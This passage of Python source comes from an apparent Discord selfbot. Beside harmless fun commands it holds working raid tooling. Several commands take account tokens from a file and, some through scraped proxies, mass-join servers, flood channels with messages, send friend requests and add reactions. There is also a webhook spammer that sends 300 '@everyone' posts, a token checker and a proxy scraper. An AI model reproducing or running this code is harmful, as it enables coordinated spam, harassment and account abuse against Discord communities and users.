        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="clyde <Text>", description="Generates a ClydeBOT image")
    async def clyde(ctx, *, text: str):
        
        request = requests.get(f'https://nekobot.xyz/api/imagegen?type=clyde&text={urllib.parse.quote(text)}')
        data = request.json()
        link = data['message']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Clyde',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="kannagen <Text>", description="Generates a kanna image")
    async def kannagen(ctx, *, text: str):
        
        request = requests.get(f'https://nekobot.xyz/api/imagegen?type=kannagen&text={urllib.parse.quote(text)}')
        data = request.json()
        link = data['message']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Kanna',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)




    @React.command(usage="lyrics <Title>", description="Shows the lyrics of a song")
    async def lyrics(ctx, *, title: str):
        try:
            request = requests.get(f'https://some-random-api.ml/lyrics?title={urllib.parse.quote(title)}')
            data = request.json()
            lyrics = data['lyrics']
            if len(lyrics) < 1950:
                embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"{data['author']} - {data['title']}", description=lyrics,timestamp=embed_timestamp())
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"{data['author']} - {data['title']}", description=lyrics[:1950])
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                await embed_or_codeblock(ctx, embed)


                
                embed2= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], description=lyrics[1950:3900],timestamp=embed_timestamp())
                embed2.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed2.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed2)


        except Exception:
            return

    @React.command(usage="cocksize <Users>", description="Do a Cock comparison")
    async def cocksize(ctx, *users: discord.User):
        
        try:
            if not users:
                users = [ctx.author]

            dongs = {}
            msg = ""
            state = random.getstate()

            for user in users:
                random.seed(user.id)
                dongs[user] = "8{}D".format("=" * random.randint(0, 30))

            random.setstate(state)
            dongs = sorted(dongs.items(), key=lambda x: x[1])

            for user, dong in dongs:
                msg += "**{}'s size:**\n{}\n".format(user.display_name, dong)

            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Cock Size', description=msg,timestamp=embed_timestamp())
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            return

    
    def random_date(start, end):
        delta = end - start
        int_delta = (delta.days * 24 * 60 * 60) + delta.seconds
        random_second = randrange(int_delta)
        return start + timedelta(seconds=random_second)

    @React.command(usage="deathdate <User>", description="Shows the Death Date of a user")
    async def deathdate(ctx, user: discord.User=None):
        
        try:
            if user is None:
                member = ctx.author
            else:
                member = user

            random.seed(member.id)
            d1 = datetime.strptime('1/1/2022', '%m/%d/%Y')
            d2 = datetime.strptime('1/1/2080', '%m/%d/%Y')
            delta = d2 - d1
            int_delta = (delta.days * 24 * 60 * 60) + delta.seconds
            random_second = randrange(int_delta)
            deathdate = d1 + timedelta(seconds=random_second)
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Death Date',timestamp=embed_timestamp())
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            embed.add_field(name=f'{member}\'s Death Date', value=f'{deathdate}', inline=True)
            await embed_or_codeblock(ctx, embed)


        except Exception:
            return
            
    @React.command(usage="dice [Sides]", description="Rolls a dice with the specified amount of sides")
    async def dice(ctx, sides: int=6):
        
        result = str(random.randint(1, sides))
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Dice',timestamp=embed_timestamp())
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        embed.add_field(name=f'Sides', value=f'{sides}', inline=False)
        embed.add_field(name=f'Result', value=f'{result}', inline=False)
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="proxyscrape", description="Scrapes proxies from Proxyscrape")
    async def proxyscrape(ctx):
        if not os.path.exists('Proxies'):
            os.makedirs('Proxies')
        file = open("Proxies/http.txt", "a+")
        res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1500')
        proxies = []
        for proxy in res.text.split('\n'):
            proxy = proxy.strip()
            if proxy:
                proxies.append(proxy)
        for p in proxies:
            file.write((p)+"\n")
        file = open("Proxies/https.txt", "a+")
        res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=https&timeout=1500')
        proxies = []
        for proxy in res.text.split('\n'):
            proxy = proxy.strip()
            if proxy:
                proxies.append(proxy)
        for p in proxies:
            file.write((p)+"\n")
        file = open("Proxies/socks4.txt", "a+")
        res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=1500')
        proxies = []
        for proxy in res.text.split('\n'):
            proxy = proxy.strip()
            if proxy:
                proxies.append(proxy)
        for p in proxies:
            file.write((p)+"\n")
        file = open("Proxies/socks5.txt", "a+")
        res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=1500')
        proxies = []
        for proxy in res.text.split('\n'):
            proxy = proxy.strip()
            if proxy:
                proxies.append(proxy)
        for p in proxies:
            file.write((p)+"\n")
            
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Proxyscrape',timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        embed.add_field(name=f'Saved to Folder', value=f'Proxies', inline=False)
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="raidjoin <Invite Code>", description="Lets all tokens join the server")
    async def raidjoin(ctx, invitecode: str):
        tokens = open('Tokens.txt', 'r')
        for _token in tokens:
            _token = _token.split('\n')
            _token = _token[0]
            async with httpx.AsyncClient() as client:
                await client.post(f'https://canary.discord.com/api/v8/invites/{invitecode}', headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'})
                
    @React.command(usage="spamwebhook <Webhook URL>", description="Spams a webhook")
    async def spamwebhook(ctx, webhook):    
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Spam Webhook',timestamp=embed_timestamp())
        embed.add_field(name=f'__üîó Spamming Webhook__', value=f'{webhook}', inline=True)
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    
        payload = json.dumps({
        "content": "@everyone",
        "embeds": [
            {
            "title": "React Webhook Spammer",
            "color": int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0),
            "thumbnail": {
                "url": json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
            },
            "footer": {
                "text": "React Selfbot"
            }
            }
        ]

        })
        try:
            for i in range(0, 300):
                async with httpx.AsyncClient() as client:
                    await client.post(webhook, data=payload.encode(), headers={'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'})
        except Exception:
            pass
    
    @React.command(usage="checktokens", description="Checks the tokens from Tokens.txt and removes invalid ones")
    async def checktokens(ctx):
        try:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Check Tokens', description=f'Starting to check the tokens from Tokens.txt, and embed will be shown after the process has completed.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


            tokens = open('Tokens.txt', 'r')
            valid_tokens = []
            for _token in tokens:
                _token = _token.split('\n')
                _token = _token[0]
                async with httpx.AsyncClient() as client:
                    resp = await client.get(f'https://canary.discord.com/api/v8/users/@me', headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'})
                    if resp.status_code == 200:
                        valid_tokens.append(_token)
            open('Tokens.txt', 'w').write('')
            for token in valid_tokens:
                open('Tokens.txt', 'a+').write(token + '\n')
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Check Tokens', description=f'Checking tokens completed.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="filespam", description="Spams the text from Spam.txt line by line")
    async def filespam(ctx):                
        try:
            f = open("Spam.txt", 'r')
            lines = f.readlines()
            try:
                for line in lines:
                    await ctx.send(line)
                    await asyncio.sleep(1)
            except:
                pass
        except Exception:
            pass
            
                
                
    @React.command(usage="raidproxyjoin <Invite Code>", description="Lets all tokens join the server")
    async def raidproxyjoin(ctx, invitecode: str):
        tokens = open('Tokens.txt', 'r')
        proxies = open('Proxies.txt', 'r')
        
        proxylist = []
        
        for p, _proxy in enumerate(proxies):
            proxy = _proxy.split('\n')[0]
            proxylist.append(proxy)
            
        for p, _token in enumerate(tokens):
            _token = _token.split('\n')
            _token = _token[0]
            async with httpx.AsyncClient() as client:
                await client.post(f'https://canary.discord.com/api/v8/invites/{invitecode}', headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'}, proxies={'http': f'{proxylist[p]}'})
                
    @React.command(usage="raidleave <Server ID>", description="Lets all tokens leave the server")
    async def raidleave(ctx, server_id: str):
        tokens = open('Tokens.txt', 'r')
        for _token in tokens:
            _token = _token.split('\n')
            _token = _token[0]
            try:
                async with httpx.AsyncClient() as client:
                    await client.delete(f'https://canary.discord.com/api/v8/users/@me/guilds/{server_id}', headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'})
            except:
                pass
                
    @React.command(usage="raidproxyleave <Server ID>", description="Lets all tokens leave the server")
    async def raidproxyleave(ctx, server_id: str):
        tokens = open('Tokens.txt', 'r')
        proxies = open('Proxies.txt', 'r')
        
        proxylist = []
        
        for p, _proxy in enumerate(proxies):
            proxy = _proxy.split('\n')[0]
            proxylist.append(proxy)
            
        for p, _token in enumerate(tokens):
            _token = _token.split('\n')
            _token = _token[0]
            async with httpx.AsyncClient() as client:
                await client.delete(f'https://canary.discord.com/api/v8/users/@me/guilds/{server_id}', headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'}, proxies={'http': f'{proxylist[p]}'})
                
    @React.command(usage="raidmessage <Channel ID> <Amount> <Message>", description="Lets all tokens write messages in a channel")
    async def raidmessage(ctx, channel_id: str, amount: int, *, msg: str):
        tokens = open('Tokens.txt', 'r')
        for _token in tokens:
            _token = _token.split('\n')
            _token = _token[0]
            async with httpx.AsyncClient() as client:
                for i in range(0, amount):
                    await client.post(f'https://canary.discord.com/api/v8/channels/{channel_id}/messages', json={'content': f'{msg}', 'tts': 'false'}, headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'})
    
    @React.command(usage="raidproxymessage <Channel ID> <Amount> <Message>", description="Lets all tokens write messages in a channel")
    async def raidproxymessage(ctx, channel_id: str, amount: int, *, msg: str):
        
        tokens = open('Tokens.txt', 'r')
        proxies = open('Proxies.txt', 'r')
        
        proxylist = []
        
        for p, _proxy in enumerate(proxies):
            proxy = _proxy.split('\n')[0]
            proxylist.append(proxy)
            
        for p, _token in enumerate(tokens):
            _token = _token.split('\n')
            _token = _token[0]
            async with httpx.AsyncClient() as client:
                await client.post(f'https://canary.discord.com/api/v8/channels/{channel_id}/messages', json={'content': f'{msg}', 'tts': 'false'}, headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'}, proxies={'http': f'{proxylist[p]}'})

    @React.command(usage="raidfriendrequest <User ID>", description="Lets all tokens send friend requests to the user")
    async def raidfriendrequest(ctx, user_id: str):
        tokens = open('Tokens.txt', 'r')
        for _token in tokens:
            _token = _token.split('\n')
            _token = _token[0]
            try:
                async with httpx.AsyncClient() as client:
                    await client.put(f'https://canary.discord.com/api/v8/users/@me/relationships/{user_id}', json={}, headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'})
            except:
                pass
                
    @React.command(usage="raidproxyfriendrequest <User ID>", description="Lets all tokens send friend requests to the user")
    async def raidproxyfriendrequest(ctx, user_id: str):
        
        tokens = open('Tokens.txt', 'r')
        proxies = open('Proxies.txt', 'r')
        
        proxylist = []
        
        for p, _proxy in enumerate(proxies):
            proxy = _proxy.split('\n')[0]
            proxylist.append(proxy)
            
        for p, _token in enumerate(tokens):
            _token = _token.split('\n')
            _token = _token[0]
            async with httpx.AsyncClient() as client:
                await client.put(f'https://canary.discord.com/api/v8/users/@me/relationships/{user_id}', json={}, headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'}, proxies={'http': f'{proxylist[p]}'})
        

    @React.command(usage="raidremovefriend <User ID>", description="Lets all tokens remove the user as friend")
    async def raidremovefriend(ctx, user_id: str):
        tokens = open('Tokens.txt', 'r')
        for _token in tokens:
            _token = _token.split('\n')
            _token = _token[0]
            async with httpx.AsyncClient() as client:
                await client.delete(f'https://canary.discord.com/api/v8/users/@me/relationships/{user_id}', headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'})
                
    @React.command(usage="raidproxyremovefriend <User ID>", description="Lets all tokens remove the user as friend")
    async def raidproxyremovefriend(ctx, user_id: str):
                    
        tokens = open('Tokens.txt', 'r')
        proxies = open('Proxies.txt', 'r')
        
        proxylist = []
        
        for p, _proxy in enumerate(proxies):
            proxy = _proxy.split('\n')[0]
            proxylist.append(proxy)
            
        for p, _token in enumerate(tokens):
            _token = _token.split('\n')
            _token = _token[0]
            async with httpx.AsyncClient() as client:
                await client.delete(f'https://canary.discord.com/api/v8/users/@me/relationships/{user_id}', headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'}, proxies={'http': f'{proxylist[p]}'})
                
    @React.command(usage="raidnick <Guild ID> <Nickname>", description="Sets the nickname of all tokens on a server")
    async def raidnick(ctx, guild_id: str, nickname: str):
        tokens = open('Tokens.txt', 'r')
        for _token in tokens:
            _token = _token.split('\n')
            _token = _token[0]
            async with httpx.AsyncClient() as client:
                await client.patch(f'https://canary.discord.com/api/v8/guilds/{guild_id}/members/%40me/nick', json={'nick': f'{nickname}'}, headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'})
                
    @React.command(usage="raidproxynick <Guild ID> <Nickname>", description="Sets the nickname of all tokens on a server")
    async def raidproxynick(ctx, guild_id: str, nickname: str):
        tokens = open('Tokens.txt', 'r')
        proxies = open('Proxies.txt', 'r')
        
        proxylist = []
        
        for p, _proxy in enumerate(proxies):
            proxy = _proxy.split('\n')[0]
            proxylist.append(proxy)
            
        for p, _token in enumerate(tokens):
            _token = _token.split('\n')
            _token = _token[0]
            async with httpx.AsyncClient() as client:
                await client.patch(f'https://canary.discord.com/api/v8/guilds/{guild_id}/members/%40me/nick', json={'nick': f'{nickname}'}, headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'}, proxies={'http': f'{proxylist[p]}'})
                                    
    @React.command(usage="raidreact <Channel ID> <Message ID> <Emoji>", description="Lets all tokens react on a message with an emoji")
    async def raidreact(ctx, channel_id: str, message_id: str, emoji: str):
        tokens = open('Tokens.txt', 'r')
        for _token in tokens:
            _token = _token.split('\n')
            _token = _token[0]
            async with httpx.AsyncClient() as client:
                await client.put(f'https://canary.discord.com/api/v8/channels/{channel_id}/messages/{message_id}/reactions/{urllib.parse.quote(emoji)}/%40me', headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'})
        
    @React.command(usage="raidproxyreact <Channel ID> <Message ID> <Emoji>", description="Lets all tokens react on a message with an emoji")
    async def raidproxyreact(ctx, channel_id: str, message_id: str, emoji: str): 
        tokens = open('Tokens.txt', 'r')
        proxies = open('Proxies.txt', 'r')
        
        proxylist = []
        
        for p, _proxy in enumerate(proxies):
            proxy = _proxy.split('\n')[0]
            proxylist.append(proxy)
            
        for p, _token in enumerate(tokens):
            _token = _token.split('\n')
            _token = _token[0]
            async with httpx.AsyncClient() as client:
                await client.put(f'https://canary.discord.com/api/v8/channels/{channel_id}/messages/{message_id}/reactions/{urllib.parse.quote(emoji)}/%40me', headers={'authorization': _token, 'user-agent': 'Mozilla/5.0'}, proxies={'http': f'{proxylist[p]}'})

    @React.command(usage="reverse <Text>", description="Reverses Text")
    async def reverse(ctx, *, text: str):
        
        await ctx.send(''.join(reversed(text)))
        
    @React.command(usage="mock <Text>", description="Spongemocks text")
    async def mock(ctx, *, text: str):
        random.seed(ctx.author.id)
        message = ''
        last_was_upper = True
        swap_chance = 0.5
        for c in text:
            if c == '?':
                if random.random() < 0.5:
                    c = '¬ø'
            
            if c == '!':
                if random.random() < 0.5:
                    c = '¬°'
            
            if c.isalpha():
                if random.random() < swap_chance:
                    last_was_upper = not last_was_upper
                    swap_chance = 0.5
                c = c.upper() if last_was_upper else c.lower()
                swap_chance += (1-swap_chance)*0.7
            message += c
        
        await ctx.send(message)
        
    @React.command(usage="vape <Text>", description="Vaporwave-style message")
    async def vape(ctx, *, text: str):
        message = ''
        for c in text:                
            message += c.upper() + " "
        
        await ctx.send(message)
        
    @React.command(usage="space <Text>", description="Spaced message")
    async def space(ctx, *, text: str):
        message = ''
        for c in text:                
            message += c + " "
        
        await ctx.send(message)
        
    @React.command(usage="hastebin <Text>", description="Uploads text to hastebin.com")
    async def hastebin(ctx, *, text: str):
        
        req = requests.post('https://hastebin.com/documents', data=text)
        await ctx.send(f'https://hastebin.com/{json.loads(req.content)["key"]}')
        
    @React.command(usage="leavegroups", description="Leaves all Groups")
    async def leavegroups(ctx):
        
        for channel in React.private_channels:
            if isinstance(channel, discord.GroupChannel):
                await channel.leave()

    @React.command(usage="deletealldms", description="Deletes all Direct Messages")
    async def deletealldms(ctx):
        try:
            for channel in React.private_channels:
                if isinstance(channel, discord.DMChannel):
                    requests.delete(f"https://canary.discord.com/api/v8/channels/{channel.id}", headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
        except Exception:
            pass


    @React.command(usage="exporttheme", description="Sends the current theme in the chat")
    async def exporttheme(ctx):
        await ctx.send(file=discord.File(fp=f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json', filename=f'{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))
        
    @React.command(usage="tts <Language(en/de/fr/es/etc)> <Text>", description="Generates a Text To Speech mp3 and sends it")
    async def tts(ctx, lang, *, text: str):
        
        tts = gTTS(text, lang=lang)
        filename = f'{text}.mp3'
